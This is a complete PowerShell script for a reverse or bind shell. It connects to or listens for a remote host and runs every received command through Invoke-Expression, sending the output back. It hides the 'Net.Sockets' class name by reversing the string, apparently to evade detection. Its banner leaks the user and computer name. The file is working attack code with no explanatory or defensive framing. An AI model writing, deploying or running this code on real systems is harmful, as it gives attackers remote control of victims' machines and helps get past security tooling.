function Power
{ 

    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    # If IP not provided as argument, prompt for it
    if (-not $IPAddress) {
        $IPAddress = Read-Host "Enter IP address"
    }

    # If Port not provided as argument, prompt for it
    if (-not $Port) {
        $PortInput = Read-Host "Enter port"
        $Port = [int]$PortInput
    }

    # If neither -Reverse nor -Bind specified, default to reverse
    if (-not $Reverse -and -not $Bind) {
        $Reverse = $true
    }

    try 
    {
        $String = "stekcoS.teN"
        $class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
        if ($Reverse)
        {
            Write-Host "[*] Connecting to $($IPAddress):$($Port)..." -ForegroundColor Green
            $client = New-Object System.$class.TCPClient($IPAddress,$Port)
        }

        if ($Bind)
        {
            Write-Host "[*] Listening on 0.0.0.0:$($Port)..." -ForegroundColor Green
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        $sbs = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sbs,0,$sbs.Length)

        $sbs = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sbs,0,$sbs.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            $sb = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sb,0,$sb.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

# Run interactively - just call the function without args
Power